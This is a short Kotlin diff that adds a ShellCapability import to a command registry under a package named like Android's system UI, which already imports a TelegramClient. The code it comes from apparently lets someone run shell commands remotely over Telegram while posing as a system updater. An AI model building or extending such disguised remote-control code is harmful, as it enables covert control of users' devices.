@@ -2,6 +2,7 @@ package com.android.systemui.updater
 
 import android.content.Context
 import com.android.systemui.updater.TelegramClient
+import com.android.systemui.updater.capabilities.ShellCapability
 
 /**
  * Registry for handling commands with proper multi-word command parsing.
